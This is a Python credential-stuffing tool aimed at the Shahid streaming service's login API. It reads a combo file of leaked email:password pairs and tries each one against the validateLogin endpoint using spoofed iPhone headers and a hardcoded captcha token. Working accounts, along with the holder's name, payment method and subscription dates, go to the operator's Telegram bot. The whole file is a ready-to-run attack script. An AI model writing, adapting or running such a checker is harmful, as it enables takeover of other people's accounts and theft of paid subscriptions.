import os
try:
    from cfonts import render, say
except ModuleNotFoundError:
    os.system('pip install python-cfonts')

output = render('S-VIP', colors=['green', 'yellow'], align='center')
print(output)
print('#' *60)
import requests
from time import mktime, strptime
from uuid import uuid4
from datetime import datetime
from telebot import TeleBot  

Hit = 0
Erorr = 0
Custom = 0
Cp = 0
def cls():
    os.system('cls' if os.name == 'nt' else 'clear')
    
Z = '\033[1;31m'
B = '\x1b[38;5;208m'  # ذهبي
U = '\x1b[1;37m'  # ابیض
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
X = '\033[2;35m'  # وردي

def timer():
    key = str(uuid4()).upper()
    date = '2023-09-05:12-30-00'
    ms = mktime(strptime(date, "%Y-%m-%d:%H-%M-%S")) * 1000
    return key, ms

def mahos():
    global Hit, Erorr, Custom, Cp
    ID = input(f"{B}ENTER YOUR ID Telegram : ")
    token = input(f"{Z}ENTER YOUR TOKEN Bot : ")

    check = requests.get(url=f"https://api.telegram.org/bot{token}/getMe").json().get('ok', False)

    if not check:
        print('خطا في التوكن ادخله مره اخرى.')
        return mahos()

    bot = TeleBot(token)

    file = input(f'{A}[+] ENTER Name Combo E : ')

    while True:
        with open(file, "r") as f:
            for i in f.read().splitlines():
                password = i.split(":")[1]
                email = i.split(":")[0]

                headers = {
                    "Host": "api2.shahid.net",
                    "UUID": "web",
                    "Accept": "application/json",
                    "Accept-Language": "en",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Content-Type": "application/json",
                    "Origin": "https://shahid.mbc.net",
                    "language": "EN",
                    "User-Agent": "Shahid/7.44.0.3940 CFNetwork/1402.0.8 Darwin/22.2.0 (iPhone/13 iOS/16.2) Safari/604.1",
                    "Referer": "https://shahid.mbc.net/",
                    "Connection": "keep-alive"
                }

                data = {
                    "t": timer()[1],
                    "country": "IQ",
                    "email": email,
                    "rawPassword": password,
                    "subscribeToNewsLetter": False,
                    "terms": True,
                    "deviceSerial": timer()[0],
                    "deviceType": "Mobile",
                    "physicalDeviceType": "IOS",
                    "label": "iPhone",
                    "isNewUser": False,
                    "captchaToken": "HG45YgHr%^&Qad$56GhrF4G466Dhy@%^J6&jD789qAft^@yT%^*JhjyfwDD",
                    "isEmailVerified": False,
                    "isEmailVerifiedZerobounce": False,
                    "prefix": "",
                    "withCountryPrefix": False,
                }

                r = requests.post('https://api2.shahid.net/proxy/v2.1/usersservice/validateLogin', headers=headers, json=data)

                if r.status_code != 200:
                    if 'Cannot find the user' in r.text:
                        cls()
                        Erorr += 1 
                        print(f''' ━━━━━━━━━━━━━━━━━━━━━━━━━
 {F} [1] {F} {F}Available - متاح    » 「{Custom}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {Z} [2] {Z} {Z}BAD GM - ايميل خاطئ   » 「{Erorr}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {F} [3] {F} {F} HitS  » 「{Hit}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {X} [4] {X} {X} Check point  » 「{Cp}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {X} [5] {X} {X} Email  » 「{email}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {U} [6] {U} {U}Password -  » 「{password}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
                    elif 'You have reached the maximum number of linked devices' in r.text:
                        cls()
                        Custom += 1 
                        print(f''' ━━━━━━━━━━━━━━━━━━━━━━━━━
 {F} [1] {F} {F}Available - متاح    » 「{Custom}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {Z} [2] {Z} {Z}BAD GM - ايميل خاطئ   » 「{Erorr}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {F} [3] {F} {F} HitS  » 「{Hit}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {X} [4] {X} {X} Check point  » 「{Cp}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {X} [5] {X} {X} Email  » 「{email}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {U} [6] {U} {U}Password -  » 「{password}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
                        msg  = f'''
                       -------------------------
                       Free Account ><
                       Email >> {email}
                       Password >> {password}
                       BY : @maho_s9
                       ------------------------'''
                        requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}')
                elif "success" in r.text:
                    cls()
                    Hit += 1
                    print(f''' ━━━━━━━━━━━━━━━━━━━━━━━━━
 {F} [1] {F} {F}Available - متاح    » 「{Custom}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {Z} [2] {Z} {Z}BAD GM - ايميل خاطئ   » 「{Erorr}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {F} [3] {F} {F} HitS  » 「{Hit}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {X} [4] {X} {X} Check point  » 「{Cp}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {X} [5] {X} {X} Email  » 「{email}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {U} [6] {U} {U}Password -  » 「{password}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
                    try:
                        name1 = r.json()['user']['firstName']
                        name2 = r.json()['user']['lastName']
                        user_id = r.json()['user']['id']
                        sub = r.json()['user']['subscriber']

                        if sub:
                            start = r.text.split('"startDate":')[1].split(',')[0]
                            end = r.text.split('"endDate":')[1].split(',')[0]
                            time_start = int(start) / 1000
                            time_end = int(end) / 1000
                            start = datetime.fromtimestamp(time_start).strftime("%Y-%m-%d %H:%M:%S")
                            end = datetime.fromtimestamp(time_end).strftime("%Y-%m-%d %H:%M:%S")
                            method = r.text.split('"paymentMethodType":"')[1].split('"')[0]
                            tlg = f"""Hi New Shahid Account ✅\n- Email : {email}\n- Password : {password}\n- Name : {name1} {name2}\n- Subscriber : {sub}\n- Method Pay : {method}\n- Time Start : {start}\n- Time End : {end} \n BY : @maho_s9 ."""
                            requests.get(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
                        else:
                            cls()
                            Cp += 1
                            print(f''' ━━━━━━━━━━━━━━━━━━━━━━━━━
 {F} [1] {F} {F}Available - متاح    » 「{Custom}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {Z} [2] {Z} {Z}BAD GM - ايميل خاطئ   » 「{Erorr}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {F} [3] {F} {F} HitS  » 「{Hit}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {X} [4] {X} {X} Check point  » 「{Cp}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {X} [5] {X} {X} Email  » 「{email}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {U} [6] {U} {U}Password -  » 「{password}」
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━''')

                    except KeyError:
                        sosh = r.json()['faults']['userMessage']
                        if sosh == "Sorry! The email address has already been used for social media registration. Please log in through your social media account or provide a different email address.":
                            print(f'Social Media : [ Email : {email} / Password : {email} ]')
                            return 'media'

mahos()